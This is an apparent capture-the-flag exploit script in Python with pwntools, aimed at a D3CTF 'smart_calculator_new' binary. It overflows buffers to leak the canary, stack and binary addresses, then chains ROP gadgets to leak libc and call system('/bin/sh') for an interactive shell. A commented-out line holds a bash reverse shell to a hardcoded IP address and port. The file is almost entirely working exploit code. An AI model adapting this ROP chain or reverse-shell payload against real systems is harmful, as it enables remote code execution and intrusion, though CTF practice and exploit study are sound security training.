from inspect import stack
from pwn import *

context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
# p = process("./smart_calculator_new")
# p = remote("139.196.214.237", 30421)
# p = remote("127.0.0.1", 9999)
p = remote("1-lb-pwn-challenge-cluster.d3ctf.io", 31067)
elf = ELF("smart_calculator_new")
libc = ELF("lib.so")
pop_rdi_ret = 0x0000000000007493
pop_rsi_r15_ret = 0x0000000000007491
csu_gadget_placement = 0x748A
csu_gadget_start = 0x7470
bin_sh_addr = 0x1B45BD
# p = None

def send_solver_id(solver_id, wait = True):
    global p
    if wait:
        p.sendafter("solver_id> ", solver_id)
    else:
        p.send(solver_id)

def send_result(result):
    global p
    p.sendafter("result> ", result)

def send_expression(expr):
    global p
    p.sendafter("expression> ", expr)

def main():
    # pause()
    p.sendlineafter("token: ", "69kpG1hlKaXin1gDvD8ltXkw3y1Ay9aj")
    send_solver_id("0"*0x100)
    # pause()
    send_expression("2+2")
    # pause()
    send_result("r"*0x100)
    p.recvuntil("r"*0x100)
    leaks = p.recvuntil(" which is incorrect...", drop=True)
    print(leaks)
    canary = u64(leaks[8: 16])
    stack_addr = u64(leaks[16: 24])
    elf_base = u64(leaks[40: 48]) - 0x69c5

    log.info("canary =======> %x"%canary)
    log.info("stack_addr =======> %x"%stack_addr)
    log.info("elf_base =======> %x"%elf_base)
    
    sleep(0.8)
    send_solver_id("1"*0x2008, False)
    # pause()
    send_expression("e"*0x100)
    # pause()
    send_result("r"*0x100)

    payload = b"2" * 0x100
    payload += b"b" * 8 + p64(canary) + p64(elf_base + elf.plt['write']) + p64(elf_base + elf.plt['read']) + b"c" * 8
    payload += p64(elf_base + csu_gadget_placement)
    payload += p64(0) + p64(1) + p64(1) + p64(elf_base + elf.got['write']) + p64(8) + p64(stack_addr - 0x60)
    payload += p64(elf_base + csu_gadget_start)
    payload += p64(0) + p64(0) + p64(1) + p64(0) + p64(stack_addr + 0x70) + p64(0x20) + p64(stack_addr - 0x58)
    payload += p64(elf_base + csu_gadget_start)
    payload += p64(0) * 7 + p64(0) * 4
    payload += b"/bin/sh\x00"
    # payload += b"/bin/bash -c \"/bin/bash -i >& /dev/tcp/106.15.59.30/20011 0>&1\"\x00"
    sleep(0.8)
    send_solver_id(payload, False)
    # pause()
    send_expression("e"*0x100)
    # send_expression(payload)
    # pause()
    send_result("r"*0x100)

    p.recvuntil(" which is incorrect...")
    libc.base = u64(p.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00")) - libc.sym['write']
    log.info("libc.base =======> %x"%libc.base)

    
    payload2 = p64(elf_base + pop_rdi_ret) + p64(stack_addr + 144) + p64(libc.base + libc.sym['system'])
    # pause()
    p.sendline(payload2)

    p.interactive()

if __name__ == "__main__":
    main()
